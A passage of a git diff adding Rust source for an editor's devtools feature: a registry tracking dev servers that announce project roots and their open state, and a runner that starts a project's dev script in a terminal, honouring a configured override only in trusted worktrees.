index 0000000..3c336dd
--- /dev/null
+++ b/crates/agent_ui/src/devtools_projects.rs
@@ -0,0 +1,455 @@
+//! Connected projects (story 055, design.md §B2): the dev servers that announced a project root,
+//! the panel sessions of each root, and whether each root is open in Zeo.
+//!
+//! A root is open while it lies inside a visible local worktree of some window, the same worktrees
+//! and the same component-wise containment `devtools_delivery` resolves a selection with; an
+//! announce never makes a root open (R7.6). The open state is re-read when a window opens or
+//! closes, when a window gains or loses a workspace, when a project gains or loses a worktree, and
+//! when Zeo quits; every change is told to the announce session and every panel session of the
+//! root, as `project_open` or `project_closed` (R2.3, R7.1, R7.3).
+//!
+//! One dev server per root (Assumption A4): a newer announce for a root ends the older session.
+//!
+//! Every line logged here is `devtools_projects event=<event>` followed by `key=value` fields, and
+//! names the root; never an app or panel URL, which may carry a query (R9.1, R9.2).
+
+use std::collections::BTreeSet;
+use std::path::{Path, PathBuf};
+
+use anyhow::Context as _;
+use collections::HashMap;
+use gpui::{App, AppContext as _, Context, Entity, EventEmitter, Global, Subscription, WeakEntity};
+use project::Project;
+use workspace::{MultiWorkspace, MultiWorkspaceEvent};
+
+use crate::browser_channel::{self, SessionId};
+use crate::browser_wire::{ServerMsg, V2};
+use crate::devtools_delivery::open_worktree_roots;
+
+/// A dev server that announced its project root.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ConnectedProject {
+    pub app_url: String,
+    pub panel_url: String,
+    /// The session that announced it; ending that session removes the project (R2.4).
+    pub announce_session: SessionId,
+    /// Whether the root lies inside a worktree open in Zeo, as last told to its sessions.
+    pub open: bool,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum DevtoolsProjectsEvent {
+    /// A dev server announced `root`, first or replacing an older one.
+    Announced(PathBuf),
+}
+
+/// The app-wide registry of connected projects and panel sessions; see the module docs.
+pub struct DevtoolsProjects {
+    projects: HashMap<PathBuf, ConnectedProject>,
+    panels: HashMap<PathBuf, Vec<SessionId>>,
+    /// The worktree roots the sessions were last told about; `is_open` reads them.
+    worktree_roots: Vec<PathBuf>,
+    /// Set once Zeo quits: nothing is open any more, whatever the windows still hold.
+    quitting: bool,
+    _subscriptions: Vec<Subscription>,
+}
+
+struct GlobalDevtoolsProjects(Entity<DevtoolsProjects>);
+
+impl Global for GlobalDevtoolsProjects {}
+
+impl EventEmitter<DevtoolsProjectsEvent> for DevtoolsProjects {}
+
+impl DevtoolsProjects {
+    /// The registry, created on first use; creating it starts watching windows and projects.
+    pub fn global(cx: &mut App) -> Entity<Self> {
+        if let Some(global) = cx.try_global::<GlobalDevtoolsProjects>() {
+            return global.0.clone();
+        }
+        let projects = cx.new(Self::new);
+        cx.set_global(GlobalDevtoolsProjects(projects.clone()));
+        projects
+    }
+
+    /// The registry, if anything has created it yet.
+    pub fn try_global(cx: &App) -> Option<Entity<Self>> {
+        cx.try_global::<GlobalDevtoolsProjects>()
+            .map(|global| global.0.clone())
+    }
+
+    fn new(cx: &mut Context<Self>) -> Self {
+        let this = cx.weak_entity();
+        let new_windows = cx.observe_new({
+            let this = this.clone();
+            move |_: &mut MultiWorkspace, _, cx| {
+                let multi_workspace = cx.entity();
+                watch_window(this.clone(), &multi_workspace, cx);
+                schedule_refresh(this.clone(), cx);
+            }
+        });
+        let new_projects = cx.observe_new({
+            let this = this.clone();
+            move |_: &mut Project, _, cx| {
+                let project = cx.entity();
+                watch_project(this.clone(), &project, cx);
+            }
+        });
+        let closed_windows = cx.on_window_closed({
+            let this = this.clone();
+            move |cx, _| schedule_refresh(this.clone(), cx)
+        });
+        let quit = cx.on_app_quit(|this, cx| {
+            this.quitting = true;
+            this.apply(Vec::new(), "quit", cx);
+            async {}
+        });
+
+        // What was open before the registry existed is watched too.
+        for window in cx.windows() {
+            let Some(multi_workspace) = window
+                .downcast::<MultiWorkspace>()
+                .and_then(|handle| handle.entity(cx).ok())
+            else {
+                continue;
+            };
+            let projects: Vec<Entity<Project>> = multi_workspace
+                .read(cx)
+                .workspaces()
+                .map(|workspace| workspace.read(cx).project().clone())
+                .collect();
+            watch_window(this.clone(), &multi_workspace, cx);
+            for project in projects {
+                watch_project(this.clone(), &project, cx);
+            }
+        }
+
+        Self {
+            projects: HashMap::default(),
+            panels: HashMap::default(),
+            worktree_roots: open_worktree_roots(cx),
+            quitting: false,
+            _subscriptions: vec![new_windows, new_projects, closed_windows, quit],
+        }
+    }
+
+    /// The connected project at `root`, if a dev server announced it and its session is alive.
+    pub fn project_for(&self, root: &Path) -> Option<&ConnectedProject> {
+        self.projects.get(&normalized(root))
+    }
+
+    /// The panel sessions of `root`, in the order they said hello.
+    pub fn panel_sessions(&self, root: &Path) -> &[SessionId] {
+        self.panels
+            .get(&normalized(root))
+            .map_or(&[], |sessions| sessions.as_slice())
+    }
+
+    /// Whether `root` lies inside a worktree open in Zeo, whether or not a dev server announced
+    /// it (R7.6).
+    pub fn is_open(&self, root: &Path) -> bool {
+        !self.quitting && holds(&self.worktree_roots, &normalized(root))
+    }
+
+    /// Records the dev server `session` announced at `root`, answers `welcome` and the root's
+    /// state, and emits [`DevtoolsProjectsEvent::Announced`]. A root inside no open worktree is
+    /// recorded too and the session kept: it is told `project_closed` (R2.3).
+    pub fn on_announce(
+        &mut self,
+        session: SessionId,
+        hello_id: Option<String>,
+        root: &Path,
+        app_url: String,
+        panel_url: String,
+        cx: &mut Context<Self>,
+    ) {
+        let root = normalized(root);
+        self.refresh(cx);
+        // One session announces one root: a repeated hello naming another root moves it.
+        let moved: Vec<PathBuf> = self
+            .projects
+            .iter()
+            .filter(|(announced, project)| {
+                project.announce_session == session && **announced != root
+            })
+            .map(|(announced, _)| announced.clone())
+            .collect();
+        for announced in moved {
+            self.projects.remove(&announced);
+            log_event(
+                log::Level::Info,
+                "project_removed",
+                &announced,
+                format!("session={session} reason=moved"),
+            );
+        }
+
+        let open = self.is_open(&root);
+        let replaced = self.projects.insert(
+            root.clone(),
+            ConnectedProject {
+                app_url,
+                panel_url,
+                announce_session: session.clone(),
+                open,
+            },
+        );
+        if let Some(older) = replaced.map(|project| project.announce_session)
+            && older != session
+        {
+            browser_channel::end_replaced_session(&older, cx);
+            log_event(
+                log::Level::Info,
+                "announce_replaced",
+                &root,
+                format!("session={older} by={session}"),
+            );
+        }
+
+        send_to(&session, &root, browser_channel::welcome(hello_id, cx), cx);
+        send_to(&session, &root, state_msg(open), cx);
+        log_event(
+            log::Level::Info,
+            "project_announced",
+            &root,
+            format!("session={session} open={open}"),
+        );
+        cx.emit(DevtoolsProjectsEvent::Announced(root));
+    }
+
+    /// Admits the panel `session` of `root` with no approval prompt (Assumption A1), answering
+    /// `welcome` and then the root's state from the worktrees (R7.6).
+    pub fn on_panel_hello(
+        &mut self,
+        session: SessionId,
+        hello_id: Option<String>,
+        root: &Path,
+        cx: &mut Context<Self>,
+    ) {
+        let root = normalized(root);
+        self.refresh(cx);
+        // One session is the panel of one root: a repeated hello naming another root moves it.
+        self.panels.retain(|panel_root, sessions| {
+            if *panel_root != root {
+                sessions.retain(|panel| *panel != session);
+            }
+            !sessions.is_empty()
+        });
+        let sessions = self.panels.entry(root.clone()).or_default();
+        if !sessions.contains(&session) {
+            sessions.push(session.clone());
+        }
+
+        let open = self.is_open(&root);
+        send_to(&session, &root, browser_channel::welcome(hello_id, cx), cx);
+        send_to(&session, &root, state_msg(open), cx);
+        log_event(
+            log::Level::Info,
+            "panel_opened",
+            &root,
+            format!("session={session} open={open}"),
+        );
+    }
+
+    /// Forgets `session`: the project it announced goes (R2.4), unless a newer announce already
+    /// replaced it, and it stops being a panel of its root.
+    pub fn on_session_end(&mut self, session: &SessionId, _cx: &mut Context<Self>) {
+        let announced: Vec<PathBuf> = self
+            .projects
+            .iter()
+            .filter(|(_, project)| project.announce_session == *session)
+            .map(|(root, _)| root.clone())
+            .collect();
+        for root in announced {
+            self.projects.remove(&root);
+            log_event(
+                log::Level::Info,
+                "project_removed",
+                &root,
+                format!("session={session} reason=ended"),
+            );
+        }
+
+        let mut closed_panels = Vec::new();
+        self.panels.retain(|root, sessions| {
+            let before = sessions.len();
+            sessions.retain(|panel| panel != session);
+            if sessions.len() != before {
+                closed_panels.push(root.clone());
+            }
+            !sessions.is_empty()
+        });
+        for root in closed_panels {
+            log_event(
+                log::Level::Info,
+                "panel_closed",
+                &root,
+                format!("session={session}"),
+            );
+        }
+    }
+
+    /// Re-reads the open worktrees and tells every root whose state changed.
+    fn refresh(&mut self, cx: &mut Context<Self>) {
+        let roots = if self.quitting {
+            Vec::new()
+        } else {
+            open_worktree_roots(cx)
+        };
+        self.apply(roots, "worktrees", cx);
+    }
+
+    /// Takes `roots` as the open worktrees, sending `project_open` or `project_closed` to the
+    /// sessions of every root whose state they change, with one log line per root.
+    fn apply(&mut self, roots: Vec<PathBuf>, reason: &str, cx: &mut Context<Self>) {
+        let tracked: BTreeSet<PathBuf> = self
+            .projects
+            .keys()
+            .chain(self.panels.keys())
+            .cloned()
+            .collect();
+        let changed: Vec<(PathBuf, bool)> = tracked
+            .into_iter()
+            .filter_map(|root| {
+                let was_open = holds(&self.worktree_roots, &root);
+                let open = holds(&roots, &root);
+                (was_open != open).then_some((root, open))
+            })
+            .collect();
+        self.worktree_roots = roots;
+
+        for (root, open) in changed {
+            if let Some(project) = self.projects.get_mut(&root) {
+                project.open = open;
+            }
+            let sessions: Vec<SessionId> = self
+                .projects
+                .get(&root)
+                .map(|project| project.announce_session.clone())
+                .into_iter()
+                .chain(self.panels.get(&root).into_iter().flatten().cloned())
+                .collect();
+            for session in &sessions {
+                send_to(session, &root, state_msg(open), cx);
+            }
+            let event = if open {
+                "project_open"
+            } else {
+                "project_closed"
+            };
+            log_event(
+                log::Level::Info,
+                event,
+                &root,
+                format!("sessions={} reason={reason}", sessions.len()),
+            );
+        }
+    }
+}
+
+/// Re-reads the open state once the current update has ended: a window is leased while it is
+/// being updated, and a leased window reads as holding nothing.
+fn schedule_refresh(this: WeakEntity<DevtoolsProjects>, cx: &mut App) {
+    cx.defer(move |cx| {
+        // A registry gone with the app has nobody left to tell.
+        this.update(cx, |this, cx| this.refresh(cx)).ok();
+    });
+}
+
+fn watch_window(
+    this: WeakEntity<DevtoolsProjects>,
+    multi_workspace: &Entity<MultiWorkspace>,
+    cx: &mut App,
+) {
+    cx.subscribe(
+        multi_workspace,
+        move |_, event: &MultiWorkspaceEvent, cx| {
+            if matches!(
+                event,
+                MultiWorkspaceEvent::WorkspaceAdded(_) | MultiWorkspaceEvent::WorkspaceRemoved(_)
+            ) {
+                schedule_refresh(this.clone(), cx);
+            }
+        },
+    )
+    // Released with the window: gpui drops the listeners of a released entity.
+    .detach();
+}
+
+/// A workspace's worktrees are often added after its window opened, by the task that opens the
+/// paths; watching only windows would leave such a root closed.
+fn watch_project(this: WeakEntity<DevtoolsProjects>, project: &Entity<Project>, cx: &mut App) {
+    cx.subscribe(project, move |_, event: &project::Event, cx| {
+        if matches!(
+            event,
+            project::Event::WorktreeAdded(_)
+                | project::Event::WorktreeRemoved(_)
+                | project::Event::WorktreePathsChanged { .. }
+        ) {
+            schedule_refresh(this.clone(), cx);
+        }
+    })
+    // Released with the project.
+    .detach();
+}
+
+/// `root` with its `.` components and trailing separator dropped, so `/p/app/` and `/p/app` are
+/// one root (Assumption A4).
+pub(crate) fn normalized(root: &Path) -> PathBuf {
+    root.components().collect()
+}
+
+/// Whether one of `worktree_roots` holds `root`. Component-wise: `/p/app` holds `/p/app/sub`
+/// but not `/p/app-other`.
+fn holds(worktree_roots: &[PathBuf], root: &Path) -> bool {
+    worktree_roots
+        .iter()
+        .any(|worktree_root| root.starts_with(worktree_root))
+}
+
+fn state_msg(open: bool) -> ServerMsg {
+    if open {
+        ServerMsg::ProjectOpen { v: V2 }
+    } else {
+        ServerMsg::ProjectClosed { v: V2 }
+    }
+}
+
+/// Sends `msg` to `session`. A session that is gone has nothing left to tell: its end is on its
+/// way to [`DevtoolsProjects::on_session_end`].
+fn send_to(session: &SessionId, root: &Path, msg: ServerMsg, cx: &mut App) {
+    let sent = browser_channel::send_to_session(session, msg, cx)
+        .with_context(|| format!("telling session {session} about {}", root.display()));
+    if let Err(error) = sent {
+        // Debug: a session ending while it is being told is the normal way sessions close.
+        log_event(
+            log::Level::Debug,
+            "message_dropped",
+            root,
+            format!("session={session} reason={:?}", format!("{error:#}")),
+        );
+    }
+}
+
+fn log_event(level: log::Level, event: &str, root: &Path, fields: String) {
+    browser_channel::log_line(
+        level,
+        format!(
+            "devtools_projects event={event} root={} {fields}",
+            loggable_root(root)
+        ),
+    );
+}
+
+/// The root as a log value: bare, or quoted when a space, quote or control character would break
+/// the `key=value` form.
+pub(crate) fn loggable_root(root: &Path) -> String {
+    let text = root.to_string_lossy();
+    if text
+        .chars()
+        .any(|char| char.is_whitespace() || char.is_control() || char == '"')
+    {
+        format!("{text:?}")
+    } else {
+        text.into_owned()
+    }
+}
diff --git a/crates/agent_ui/src/devtools_run.rs b/crates/agent_ui/src/devtools_run.rs
new file mode 100644
index 0000000..b1b126a
--- /dev/null
+++ b/crates/agent_ui/src/devtools_run.rs
@@ -0,0 +1,879 @@
+//! `devtools: start` (story 055, design.md §B5): the command it runs for a project root.
+//!
+//! A `devtools.dev_command` override wins when the worktree is trusted (R1.2); otherwise the
+//! root's `package.json` `scripts.dev` runs through the detected package manager (R1.1). The
+//! override is a project file choosing what Zeo executes, so in an untrusted worktree it is
+//! ignored and the operator is told why (R1.3). With neither, nothing runs (R1.4).
+//!
+//! The command runs as a task in a Zeo terminal. This module owns the roots whose dev server Zeo
+//! started and finds their terminals ([`started_by_zeo`]): a second start focuses the running one
+//! (R1.5), `devtools: stop` closes it (R1.7-R1.8), and so does the project's window going away or
+//! Zeo quitting (R7.4), explicitly, since a dropped terminal is not dropped on time (GOTCHA G5).
+//! A server that does not announce itself within 60 s is reported (R1.6).
+//!
+//! Every line logged here is `devtools_run event=<event>` followed by `key=value` fields naming
+//! the root; never the override's text, which a project file wrote.
+
+use std::path::{Path, PathBuf};
+use std::time::Duration;
+
+use anyhow::{Result, bail};
+use collections::HashMap;
+use fs::Fs;
+use futures::channel::oneshot;
+use gpui::{
+    AnyWindowHandle, App, AppContext as _, Context, Entity, Global, Subscription, Task,
+    TaskExt as _, WeakEntity, Window, WindowId, actions,
+};
+use project::trusted_worktrees::TrustedWorktrees;
+use project::{Project, TaskSourceKind, WorktreeId};
+use serde_json::Value;
+use settings::{RegisterSetting, Settings, SettingsContent, SettingsLocation};
+use task::{RevealStrategy, TaskContext, TaskId, TaskTemplate};
+use terminal_view::TerminalView;
+use terminal_view::terminal_panel::TerminalPanel;
+use util::rel_path::RelPath;
+use workspace::notifications::NotificationId;
+use workspace::tasks::ScheduledTaskResult;
+use workspace::{MultiWorkspace, MultiWorkspaceEvent, Pane, SaveIntent, Toast, Workspace};
+
+use crate::browser_channel::log_line;
+use crate::devtools_projects::{
+    DevtoolsProjects, DevtoolsProjectsEvent, loggable_root, normalized,
+};
+
+actions!(
+    devtools,
+    [
+        /// Runs the project's dev server in a terminal, or focuses that terminal when Zeo already
+        /// runs it.
+        Start,
+        /// Stops the dev server Zeo started for the project by closing its terminal.
+        Stop,
+    ]
+);
+
+/// What R1.4 shows when there is nothing to run.
+pub const NO_DEV_SCRIPT: &str = "This project has no dev script";
+/// What R1.6 shows when a dev server Zeo started has not announced itself in time.
+pub const NOT_ANNOUNCED: &str =
+    "The dev server did not connect to Zeo — is @lucascouts/zeo-devtools in its config?";
+/// What R1.8 shows when there is nothing of Zeo's to stop.
+pub const NOTHING_TO_STOP: &str = "No dev server started by Zeo for this project";
+const NO_LOCAL_PROJECT: &str = "Open a local project to start its dev server";
+/// The label of the task, and of its terminal tab.
+pub const TASK_LABEL: &str = "devtools: dev server";
+/// How long a dev server Zeo started has to announce itself (R1.6).
+pub const ANNOUNCE_TIMEOUT: Duration = Duration::from_secs(60);
+
+const UNTRUSTED_OVERRIDE: &str =
+    "devtools.dev_command is ignored because this project is not trusted";
+
+/// The `devtools` settings a project may set; see `DevtoolsSettingsContent`.
+#[derive(Clone, Debug, Default, PartialEq, Eq, RegisterSetting)]
+pub struct DevtoolsSettings {
+    /// Read for a worktree, and honoured only when that worktree is trusted.
+    pub dev_command: Option<String>,
+}
+
+impl Settings for DevtoolsSettings {
+    fn from_settings(content: &SettingsContent) -> Self {
+        let dev_command = content
+            .project
+            .devtools
+            .as_ref()
+            .and_then(|devtools| devtools.dev_command.clone());
+        Self { dev_command }
+    }
+}
+
+/// The command `devtools: start` hands to a terminal.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct ResolvedDevCommand {
+    /// The program, or, with no `args`, a trusted override's whole command line for the shell.
+    pub command: String,
+    pub args: Vec<String>,
+    /// Why a project override was not used, for the operator's notification (R1.3).
+    pub notice: Option<String>,
+}
+
+impl ResolvedDevCommand {
+    pub fn command_line(&self) -> String {
+        std::iter::once(&self.command)
+            .chain(&self.args)
+            .map(String::as_str)
+            .collect::<Vec<_>>()
+            .join(" ")
+    }
+}
+
+/// Resolves what `devtools: start` runs in `root`; the error is the operator-facing reason.
+pub async fn resolve_dev_command(
+    fs: &dyn Fs,
+    root: &Path,
+    dev_command: Option<String>,
+    trusted: bool,
+) -> Result<ResolvedDevCommand> {
+    let dev_command = dev_command.filter(|command| !command.trim().is_empty());
+    let override_ignored = match dev_command {
+        Some(command) if trusted => {
+            return Ok(ResolvedDevCommand {
+                command,
+                args: Vec::new(),
+                notice: None,
+            });
+        }
+        Some(_) => {
+            log::warn!("devtools_run event=override_ignored reason=untrusted root={root:?}");
+            true
+        }
+        None => false,
+    };
+
+    let package_json = match read_package_json(fs, root).await {
+        Some(package_json) if has_dev_script(&package_json) => package_json,
+        _ if override_ignored => bail!("{NO_DEV_SCRIPT}. {UNTRUSTED_OVERRIDE}."),
+        _ => bail!(NO_DEV_SCRIPT),
+    };
+    let package_manager = detect_package_manager(fs, root, &package_json).await;
+    Ok(ResolvedDevCommand {
+        command: package_manager.to_string(),
+        args: vec!["run".to_string(), "dev".to_string()],
+        notice: override_ignored
+            .then(|| format!("{UNTRUSTED_OVERRIDE}: running its dev script instead.")),
+    })
+}
+
+/// The root's `package.json`, or `None` when it is absent, unreadable or not JSON — the last two
+/// logged, since for the operator all three mean "no dev script".
+async fn read_package_json(fs: &dyn Fs, root: &Path) -> Option<Value> {
+    let path = root.join("package.json");
+    if !fs.is_file(&path).await {
+        return None;
+    }
+    let text = fs
+        .load(&path)
+        .await
+        .inspect_err(|error| {
+            log::warn!("devtools_run event=package_json_unreadable root={root:?} error={error:#}")
+        })
+        .ok()?;
+    serde_json::from_str(&text)
+        .inspect_err(|error| {
+            log::warn!("devtools_run event=package_json_invalid root={root:?} error={error}")
+        })
+        .ok()
+}
+
+/// Only `scripts.dev` is the dev script: not `dev:server`, `predev` or a top-level `dev` key.
+fn has_dev_script(package_json: &Value) -> bool {
+    package_json
+        .pointer("/scripts/dev")
+        .and_then(Value::as_str)
+        .is_some_and(|script| !script.trim().is_empty())
+}
+
+/// `languages`' detector is private and knows no bun, hence this one (design.md §B5).
+async fn detect_package_manager(fs: &dyn Fs, root: &Path, package_json: &Value) -> &'static str {
+    // corepack writes `<name>@<version>[+<hash>]`.
+    let declared = package_json
+        .get("packageManager")
+        .and_then(Value::as_str)
+        .map(|field| field.split_once('@').map_or(field, |(name, _)| name));
+    if let Some(name) = declared
+        && let Some(known) = ["bun", "pnpm", "yarn", "npm"]
+            .into_iter()
+            .find(|known| *known == name)
+    {
+        return known;
+    }
+    for (lockfile, package_manager) in [
+        ("bun.lock", "bun"),
+        ("bun.lockb", "bun"),
+        ("pnpm-lock.yaml", "pnpm"),
+        ("yarn.lock", "yarn"),
+    ] {
+        if fs.is_file(&root.join(lockfile)).await {
+            return package_manager;
+        }
+    }
+    "npm"
+}
+
+/// What [`start`] did; the terminal itself appears once the command is resolved.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum StartOutcome {
+    /// The command is being resolved, then handed to a new terminal.
+    Starting,
+    /// Zeo already runs this root's dev server: nothing new runs and its terminal is focused (R1.5).
+    FocusedRunning,
+    /// The workspace has no local worktree to run a dev server in.
+    NoLocalProject,
+}
+
+/// The notification ids: one per kind, so a repeat replaces the last one instead of stacking.
+struct StartToast;
+struct NoticeToast;
+struct NotAnnouncedToast;
+struct StopToast;
+
+pub(crate) fn init(cx: &mut App) {
+    cx.observe_new(|workspace: &mut Workspace, _window, _cx| {
+        workspace
+            .register_action(|workspace, _: &Start, window, cx| {
+                start(workspace, window, cx);
+            })
+            .register_action(|workspace, _: &Stop, window, cx| stop(workspace, window, cx));
+    })
+    .detach();
+}
+
+/// `devtools: start` for the workspace's root (R1.1-R1.6).
+pub fn start(
+    workspace: &mut Workspace,
+    window: &mut Window,
+    cx: &mut Context<Workspace>,
+) -> StartOutcome {
+    let Some((root, worktree_id)) = local_root(workspace, cx) else {
+        show_toast(
+            workspace,
+            NotificationId::unique::<StartToast>(),
+            NO_LOCAL_PROJECT,
+            cx,
+        );
+        return StartOutcome::NoLocalProject;
+    };
+    let runs = DevtoolsRuns::global(cx);
+    let running = runs
+        .read(cx)
+        .runs
+        .get(&root)
+        .map(|run| (run.task_id.clone(), run.workspace.clone(), run.window));
+    if let Some((task_id, run_workspace, run_window)) = running {
+        log_event(log::Level::Info, "already_running", &root, String::new());
+        // Still resolving: there is no terminal yet, and none will be added twice.
+        if let Some(task_id) = task_id {
+            focus_terminal(task_id, run_workspace, run_window, cx);
+        }
+        return StartOutcome::FocusedRunning;
+    }
+
+    let location = SettingsLocation {
+        worktree_id,
+        path: RelPath::empty(),
+    };
+    let dev_command = DevtoolsSettings::get(Some(location), cx)
+        .dev_command
+        .clone();
+    let trusted = is_trusted(workspace.project(), worktree_id, cx);
+    let fs = workspace.project().read(cx).fs().clone();
+    let multi_workspace = window.root::<MultiWorkspace>().flatten();
+    let workspace_handle = cx.weak_entity();
+    let run_id = runs.update(cx, |runs, cx| {
+        runs.begin(
+            root.clone(),
+            workspace_handle,
+            window.window_handle(),
+            multi_workspace,
+            cx,
+        )
+    });
+    log_event(log::Level::Info, "start", &root, format!("run={run_id}"));
+
+    // Detached: a stop while resolving removes the run, and `schedule` then finds none.
+    cx.spawn_in(window, {
+        let root = root.clone();
+        let runs = runs.downgrade();
+        async move |workspace, cx| {
+            let resolved = resolve_dev_command(fs.as_ref(), &root, dev_command, trusted).await;
+            let scheduled = workspace.update_in(cx, |workspace, window, cx| match resolved {
+                Ok(resolved) => schedule(workspace, &root, run_id, resolved, window, cx),
+                Err(error) => {
+                    log_event(
+                        log::Level::Info,
+                        "nothing_to_run",
+                        &root,
+                        format!("run={run_id}"),
+                    );
+                    show_toast(
+                        workspace,
+                        NotificationId::unique::<StartToast>(),
+                        format!("{error:#}"),
+                        cx,
+                    );
+                    false
+                }
+            });
+            let scheduled = scheduled.unwrap_or_else(|error| {
+                log_event(
+                    log::Level::Warn,
+                    "start_failed",
+                    &root,
+                    format!("run={run_id} error={:?}", format!("{error:#}")),
+                );
+                false
+            });
+            if !scheduled {
+                runs.update(cx, |runs, _| runs.forget(&root, run_id)).ok();
+            }
+        }
+    })
+    .detach();
+    StartOutcome::Starting
+}
+
+/// `devtools: stop` for the workspace's root: closes the terminal of the dev server Zeo started
+/// (R1.7), or stops nothing and says so (R1.8) — a server the operator started by hand, and its
+/// session, are never touched.
+pub fn stop(workspace: &mut Workspace, _window: &mut Window, cx: &mut Context<Workspace>) {
+    let run = local_root(workspace, cx).and_then(|(root, _)| {
+        let run = DevtoolsRuns::try_global(cx)?.update(cx, |runs, _| runs.runs.remove(&root))?;
+        Some((root, run))
+    });
+    let Some((root, run)) = run else {
+        show_toast(
+            workspace,
+            NotificationId::unique::<StopToast>(),
+            NOTHING_TO_STOP,
+            cx,
+        );
+        return;
+    };
+    log_event(log::Level::Info, "stop", &root, format!("run={}", run.id));
+    // This workspace is being updated, and its terminal may live in it.
+    cx.defer(move |cx| close_terminal(&root, run, cx));
+}
+
+/// Whether Zeo started the dev server of `root` and has not seen it end; Zeo stops only those
+/// with their project (R7.4).
+pub fn started_by_zeo(root: &Path, cx: &App) -> bool {
+    DevtoolsRuns::try_global(cx)
+        .is_some_and(|runs| runs.read(cx).runs.contains_key(&normalized(root)))
+}
+
+/// How the wait for a dev server's announce ended, as [`wait_for_announce`] tells it.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum AnnounceWait {
+    /// The server announced its root.
+    Announced,
+    /// [`ANNOUNCE_TIMEOUT`] passed first, and R1.6's message was shown.
+    TimedOut,
+}
+
+/// Waits for the announce of the dev server Zeo started for `root`, on the same deadline as
+/// R1.6's notice, so whoever waits ends exactly when the notice shows (R4.7). The receiver is
+/// cancelled when the run ends without an announce: its command could not be resolved, it was
+/// stopped, or it exited. `None` when Zeo runs no dev server for `root`.
+pub(crate) fn wait_for_announce(
+    root: &Path,
+    cx: &mut App,
+) -> Option<oneshot::Receiver<AnnounceWait>> {
+    DevtoolsRuns::try_global(cx)?.update(cx, |runs, cx| runs.wait(&normalized(root), cx))
+}
+
+/// R1.6's timer for run `id` of `root`.
+fn announce_timer(root: &Path, id: u64, cx: &mut Context<DevtoolsRuns>) -> Task<()> {
+    cx.spawn({
+        let root = root.to_path_buf();
+        async move |this, cx| {
+            cx.background_executor().timer(ANNOUNCE_TIMEOUT).await;
+            this.update(cx, |runs, cx| runs.timed_out(&root, id, cx))
+                .ok();
+        }
+    })
+}
+
+/// Hands the resolved command to a new terminal; `false` when nothing was scheduled.
+fn schedule(
+    workspace: &mut Workspace,
+    root: &Path,
+    run_id: u64,
+    resolved: ResolvedDevCommand,
+    window: &mut Window,
+    cx: &mut Context<Workspace>,
+) -> bool {
+    let Some(runs) = DevtoolsRuns::try_global(cx) else {
+        return false;
+    };
+    // Stopped while the command was being resolved.
+    if runs.read(cx).run(root, run_id).is_none() {
+        return false;
+    }
+    if let Some(notice) = resolved.notice {
+        show_toast(
+            workspace,
+            NotificationId::unique::<NoticeToast>(),
+            notice,
+            cx,
+        );
+    }
+    let template = TaskTemplate {
+        label: TASK_LABEL.to_string(),
+        command: resolved.command,
+        args: resolved.args,
+        use_new_terminal: true,
+        allow_concurrent_runs: false,
+        reveal: RevealStrategy::NoFocus,
+        ..TaskTemplate::default()
+    };
+    // The cwd goes through the context, not the template, so a root holding `$ZED_` text is a
+    // path and not a variable to substitute.
+    let task_context = TaskContext {
+        cwd: Some(root.to_path_buf()),
+        ..TaskContext::default()
+    };
+    // The root in the id base keeps two roots running the same command apart.
+    let id_base = format!("devtools_dev_server_{}", root.display());
+    let Some(task) = template.resolve_task(&id_base, &task_context) else {
+        // A trusted override naming an unknown `$ZED_` variable.
+        log_event(
+            log::Level::Warn,
+            "unresolvable",
+            root,
+            format!("run={run_id}"),
+        );
+        show_toast(
+            workspace,
+            NotificationId::unique::<StartToast>(),
+            "devtools.dev_command uses a variable Zeo does not know",
+            cx,
+        );
+        return false;
+    };
+    let task_id = task.id.clone();
+    let on_complete = {
+        let root = root.to_path_buf();
+        let runs = runs.downgrade();
+        move |result: ScheduledTaskResult, cx: &mut gpui::AsyncWindowContext| {
+            runs.update(cx, |runs, _| runs.on_exit(&root, run_id, result))
+                .ok();
+        }
+    };
+    workspace.schedule_resolved_task_with_completion(
+        TaskSourceKind::UserInput,
+        task,
+        true,
+        on_complete,
+        window,
+        cx,
+    );
+    runs.update(cx, |runs, cx| runs.scheduled(root, run_id, task_id, cx));
+    true
+}
+
+/// The roots whose dev server Zeo started, with their terminals (design.md §B5); B2's registry
+/// of connected projects never holds this.
+struct DevtoolsRuns {
+    runs: HashMap<PathBuf, Run>,
+    next_run: u64,
+    /// Set once Zeo quits, when every run has been stopped already.
+    quitting: bool,
+    _subscriptions: Vec<Subscription>,
+}
+
+/// A dev server Zeo started for one root.
+struct Run {
+    id: u64,
+    workspace: WeakEntity<Workspace>,
+    window: AnyWindowHandle,
+    /// The task handed to the terminal, which finds its terminal; `None` while resolving.
+    task_id: Option<TaskId>,
+    /// R1.6's timer, dropped by the root's announce.
+    timeout: Option<Task<()>>,
+    /// Who awaits this server's announce ([`wait_for_announce`]); dropped with the run, which
+    /// tells them it ended without one.
+    waiters: Vec<oneshot::Sender<AnnounceWait>>,
+    _workspace_removed: Option<Subscription>,
+}
+
+struct GlobalDevtoolsRuns(Entity<DevtoolsRuns>);
+
+impl Global for GlobalDevtoolsRuns {}
+
+impl DevtoolsRuns {
+    fn global(cx: &mut App) -> Entity<Self> {
+        if let Some(global) = cx.try_global::<GlobalDevtoolsRuns>() {
+            return global.0.clone();
+        }
+        let runs = cx.new(Self::new);
+        cx.set_global(GlobalDevtoolsRuns(runs.clone()));
+        runs
+    }
+
+    fn try_global(cx: &App) -> Option<Entity<Self>> {
+        cx.try_global::<GlobalDevtoolsRuns>()
+            .map(|global| global.0.clone())
+    }
+
+    fn new(cx: &mut Context<Self>) -> Self {
+        let this = cx.weak_entity();
+        // `on_window_closed` fires once the window is gone, so it cannot be updated; its
+        // terminals are killed through their entities (GOTCHA G15).
+        let closed_windows = cx.on_window_closed({
+            let this = this.clone();
+            move |cx, window_id| {
+                this.update(cx, |runs, cx| runs.window_closed(window_id, cx))
+                    .ok();
+            }
+        });
+        // Quit observers run before the windows are cleared, so the terminals are still there.
+        let quit = cx.on_app_quit(|runs, cx| {
+            runs.quitting = true;
+            for (root, run) in std::mem::take(&mut runs.runs) {
+                log_event(
+                    log::Level::Info,
+                    "stop",
+                    &root,
+                    format!("run={} reason=quit", run.id),
+                );
+                close_terminal(&root, run, cx);
+            }
+            async {}
+        });
+        subscribe_to_announces(this, cx);
+        Self {
+            runs: HashMap::default(),
+            next_run: 0,
